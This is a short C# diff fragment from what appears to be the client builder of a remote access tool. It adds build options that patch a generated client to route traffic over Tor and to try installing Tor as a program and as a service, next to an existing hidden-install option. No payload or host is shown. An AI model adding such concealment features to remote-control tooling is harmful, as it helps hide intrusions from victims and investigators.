@@ -101,6 +101,15 @@ namespace xServer.Core.Build
                                         case 6: // HideInstallSubdirectory
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.HideInstallSubdirectory));
                                             break;
+                                        case 7: // Use Tor
+                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.UseTor));
+                                            break;
+                                        case 8: // Try Install Tor
+                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.TryInstallTor));
+                                            break;
+                                        case 9: // Try Install Tor Service
+                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(options.TryInstallTorService));
+                                            break;
                                     }
                                     bools++;
                                 }
